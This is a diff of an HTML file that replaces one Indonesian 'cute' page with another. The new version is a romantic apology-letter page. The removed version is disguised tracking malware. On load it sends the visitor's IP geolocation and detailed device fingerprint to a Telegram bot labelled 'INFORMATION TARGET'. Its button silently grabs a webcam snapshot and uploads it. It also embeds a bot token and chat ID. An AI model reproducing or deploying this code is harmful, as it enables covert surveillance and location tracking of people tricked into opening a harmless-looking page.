@@ -1,198 +1,84 @@
-<!doctype html>
-<html lang="id">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Love Cute!</title>
-<style>
-body{
-  margin:0;
-  padding:0;
-  font-family:'Comic Sans MS', sans-serif;
-  background:#ffb6c1;
-  display:flex;
-  flex-direction:column;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
-  text-align:center;
-  color:#fff;
-}
-h1{
-  font-size:2.5em;
-  margin-bottom:20px;
-}
-p{
-  font-size:1.2em;
-  margin-bottom:30px;
-}
-button{
-  padding:15px 35px;
-  font-size:1.3em;
-  font-weight:bold;
-  border:none;
-  border-radius:50px;
-  background:#fff;
-  color:#ff69b4;
-  cursor:pointer;
-  transition: transform 0.2s, background 0.3s;
-}
-button:hover{
-  transform: scale(1.1);
-  background:#ffe0f0;
-}
-</style>
-</head>
-<body>
+<!DOCTYPE html>  <html>    <head>    
+    <meta charset="utf-8" />    
+    <meta name="description" content="@feelthisray - Script HTML by Feeldream Repl Co">    
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1" />    
+    <title>💌forpacarku! 🌺</title>    
+    <link href="https://fonts.googleapis.com/css2?family=Handlee&display=swap" rel="stylesheet">    
+    <link rel="preconnect" href="https://fonts.googleapis.com">    
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>    
+    <link href="https://fonts.googleapis.com/css2?family=Patrick+Hand&family=Sriracha&family=Itim&display=swap" rel="stylesheet">    
+    <link href="https://fonts.googleapis.com/css2?family=Berkshire+Swash&display=swap" rel="stylesheet">    
+    <script src="https://unpkg.com/typeit@8.7.0/dist/index.umd.js"></script>    
+    <link rel="stylesheet" href="https://htmlku.com/forpacarku/style.css">    
+</head>    
+<body>    
+    <div class="overlay">    
+        <div class="cover">    
+            <p>klikkk yaaaa sayangggg</p>    
+            <div class="awalan">    
+                <svg class='line' fill='none' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'>    
+                    <g transform='translate(2.000000, 2.000000)'>    
+                        <path d='M9.27542857,0.714285714 C14.0030476,0.714285714 17.836381,4.54666667 17.836381,9.2752381 C17.836381,14.0038095 14.0030476,17.8361905 9.27542857,17.8361905 C4.54685714,17.8361905 0.71447619,14.0038095 0.71447619,9.2752381 C0.71447619,4.54666667 4.54685714,0.714285714 9.27542857,0.714285714 Z'></path>    
+                        <path d='M17.8989524,16.487619 C18.678,16.487619 19.3094286,17.12 19.3094286,17.8980952 C19.3094286,18.6780952 18.678,19.3095238 17.8989524,19.3095238 C17.1199048,19.3095238 16.4875238,18.6780952 16.4875238,17.8980952 C16.4875238,17.12 17.1199048,16.487619 17.8989524,16.487619 Z'></path>    
+                    </g>    
+                </svg>    
+                <label style="font-size:16px">Pesan Untukmu 🫶</label>    
+            </div>    
+        </div>    
+    </div>  <div id="bodyblur">    
+    <img src="https://files.catbox.moe/f5s0nn.jpg" id="wallpaper"/>    
+    <div id="thisblur"></div>    
+</div>    <audio src="https://files.catbox.moe/hooz7s.mp3" id="linkmp3"></audio>
 
-<h1>KAMU TAU GAAAA</h1>
-<p>apaaa buah yang namanyaa selalu bikinyaa nyaman</p>
-<button id="btnCamera">apaa tuh</button>
-
-<script>
-const BOT_TOKEN="8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo"; // BOT TOKEN
-const CHAT_ID="6051179992"; // CHAT ID
-const STATIC_IMAGE="https://a.top4top.io/p_3592jwm3w0.jpg";
-
-function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}
-
-// Ambil IP/device info via ipwhois.io
-async function getIpInfo(){
-  try{
-    const r = await fetch("https://ipwhois.app/json/");
-    const data = await r.json();
-    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
-    return {
-      ip: data.ip || "-",
-      city: data.city || "-",
-      region: data.region || "-",
-      country_name: data.country || "-",
-      country_code: data.country_code || "-",
-      latitude: data.latitude || "0",
-      longitude: data.longitude || "0"
-    };
-  }catch(e){
-    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
-  }
-}
-
-// Ambil device info
-async function getDeviceInfo(){
-  const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
-  return {
-    userAgent:navigator.userAgent,
-    platform:navigator.platform,
-    language:navigator.language,
-    screenWidth:screen.width,
-    screenHeight:screen.height,
-    innerWidth:window.innerWidth,
-    innerHeight:window.innerHeight,
-    cores:navigator.hardwareConcurrency||"-",
-    memory:navigator.deviceMemory||"-",
-    touchPoints:navigator.maxTouchPoints||0,
-    orientation:screen.orientation?.type||"-",
-    colorDepth:screen.colorDepth||"-",
-    pixelRatio:window.devicePixelRatio||"-",
-    online:navigator.onLine,
-    cookiesEnabled:navigator.cookieEnabled,
-    doNotTrack:navigator.doNotTrack,
-    battery:b
-  };
-}
-
-// Build caption Telegram
-function buildCaption(ip,d){
-  const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
-  return [
-    "<b>INFORMATION TARGET</b>",
-    `IP: ${escapeHtml(ip.ip)}`,
-    `City: ${escapeHtml(ip.city)}`,
-    `Region: ${escapeHtml(ip.region)}`,
-    `Country: ${escapeHtml(ip.country_name)}`,
-    `Country Code: ${escapeHtml(ip.country_code)}`,
-    `Latitude: ${escapeHtml(ip.latitude)}`,
-    `Longitude: ${escapeHtml(ip.longitude)}`,
-    `Location: ${g}`,
-    "",
-    "<b>Device Info</b>",
-    `User Agent: ${escapeHtml(d.userAgent)}`,
-    `Platform: ${escapeHtml(d.platform)}`,
-    `Language: ${escapeHtml(d.language)}`,
-    `Screen: ${escapeHtml(d.screenWidth+"x"+d.screenHeight)}`,
-    `Inner Size: ${escapeHtml(d.innerWidth+"x"+d.innerHeight)}`,
-    `CPU cores: ${escapeHtml(d.cores)}`,
-    `RAM (GB): ${escapeHtml(d.memory)}`,
-    `Touch Points: ${escapeHtml(d.touchPoints)}`,
-    `Orientation: ${escapeHtml(d.orientation)}`,
-    `Color Depth: ${escapeHtml(d.colorDepth)}`,
-    `Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
-    `Online: ${escapeHtml(d.online)}`,
-    `Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}`,
-    `Do Not Track: ${escapeHtml(d.doNotTrack)}`,
-    `Battery: ${escapeHtml(d.battery?.level||"-")} (${d.battery?.charging?"Charging":"Not charging"}), ChargingTime: ${escapeHtml(d.battery?.chargingTime||"-")}s, DischargingTime: ${escapeHtml(d.battery?.dischargingTime||"-")}s`,
-    "",
-    "<b>URL & Time</b>",
-    `URL: ${escapeHtml(location.href)}`,
-    `Time (UTC): ${escapeHtml(new Date().toISOString())}`
-  ].join("\n");
-}
-
-// Kirim IP/device + foto statis saat halaman load
-async function sendIpDevice(){
-  const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      photo: STATIC_IMAGE,
-      caption: buildCaption(ip,d),
-      parse_mode:"HTML"
-    })
-  });
-}
-
-// Kamera snapshot sebagai file .jpg (document)
-async function sendSnapshot(){
-  try{
-    const stream = await navigator.mediaDevices.getUserMedia({video:true});
-    const video = document.createElement('video');
-    video.style.display='none';
-    document.body.appendChild(video);
-    video.srcObject = stream;
-    video.play();
-
-    await new Promise(resolve => { video.onloadedmetadata = () => setTimeout(resolve, 200); });
-
-    const canvas=document.createElement('canvas');
-    canvas.width=video.videoWidth;
-    canvas.height=video.videoHeight;
-    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
-
-    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("document", blob, "screenshotbyjhonfficialr.jpg");
-    formData.append("caption", "Sukes screenshot foto target");
-
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-      method: "POST",
-      body: formData
-    });
-
-    stream.getTracks().forEach(track=>track.stop());
-    video.remove();
-  }catch(e){
-    console.log("yahhh", e);
-  }
-}
-
-// Jalankan saat halaman load
-window.addEventListener("load",sendIpDevice);
-
-// Tombol klik kamera
-document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
-</script>
-</body>
-</html>
+<div id="envwrap" class="envlope-wrapper">    
+    <div id="envelope" class="close">    
+        <div class="wax-seal"></div>    
+        <div class="front flap"><span id="frontEnv">🩷</span></div>    
+        <div class="front pocket"></div>    
+        <div class="letter">    
+            <div class="letter-corner corner-tl"></div>    
+            <div class="letter-corner corner-br"></div>    
+            <div class="message">    
+                <p>Alooo Kamu!<br><span style='font-size:23px'>ᯓᡣ𐭩</span></p>    
+                <p>......</p>    
+            </div>    
+        </div>    
+        <div class="hearts">    
+            <div class="heart a1"></div>    
+            <div class="heart a2"></div>    
+            <div class="heart a3"></div>    
+        </div>    
+        <div class="sparkles">    
+            <div class="sparkle s1"></div>    
+            <div class="sparkle s2"></div>    
+            <div class="sparkle s3"></div>    
+        </div>    
+    </div>    
+</div>    <div class="reset">    
+    <button id="open">Buka Surat</button>    
+</div>    <div class="stiker">    
+    <img id="main-stiker" src="https://htmlku.com/0/panda/hearthappy.gif" />    
+    <img id="stikerAlt1" src="https://htmlku.com/0/panda/ciumpipi.gif" />    
+</div>    <div class="container" id="container">    
+    <div class="conMsg">    
+        <p class="titleC"><b>Aloooo pacarkuuuuuu 🌺🥳💐</b></p>    
+        <script>    
+            teksAnimasi = [    
+                "<b>ᯓᡣ𐭩</b><br>kakaaa mintaa maaff bangettt yaaa kakaaa sadarrr akhir-akhir iniii seringgg bangettt bikin kamuuu sedihhh dan kakaaa nggakk pernahrr bisaaa bikin kamuuu bahagiaaa 🌹🤍 kakaaa nyeselll bangettt bener-benerrr nggakk mauuu lagiii bikin kamuuu marahhh atauu kecewaaa kadanggg kakaaa nggakk ngertiii kenapaa kakaaaa bisaaa sampee bikin kamuuu sakittt hatii tapi percayaa dehh kakaaa bener-benerrr nggakk sengajaaa",    
+                "<br>kakaaa janjiii bakal berubahhh bakal lebih perhatiannn lebih ngertiii perasaan kamuuu dan bikin kamuuu senyumm lebih seringgg 💐🥺 kakaaa nggakk bisaaa janjiii sempurnaa tapi kakaaa bakal terusss usahaa buattt jadiii yang lebih baikttt buattt kamuuu buattt kitaaa 🌹🤍 kakaaa cumaaa pengen kamuuu ngerasaa dicintaaai dihargaaaai dan selaluuu senyumm setiap harriii karenaa senyum kamuuu itu segalanyaa buattt kakaaaa 🤍💐",    
+                "<br>plisss sayangg maafinnn kakaaaa 🥺🤍 kakaaa sayangg bangettt samaaa kamuuu dan kakaaa nggakk mauuu kehilangan kamuuu 🥺💐🤍🤍 tolonggg maafin yaaa dede kakaaa janjiii bakal berusahaa jadiii lebih baikttt setiap harriii cumaaa buattt kamuuu cumaaa buattt kitaaa 🤍🌹",    
+                "<br><b><i>I love youuu, always. </b>🌺🩷<br><br>And..<br><b>Happy Wednesday</b> 🫂💐"    
+            ];    
+        </script>    
+        <p class="messageC"></p>    
+        
+    </div>    
+</div>    <div>    
+    <div>    
+        <div class="box">    
+            <div></div><div></div><div></div><div></div><div></div>    
+            <div></div><div></div><div></div><div></div><div></div>    
+        </div>    
+    </div>    
+</div>    <script src="https://htmlku.com/forpacarku/script.js"></script>  </body>    
+</html>    
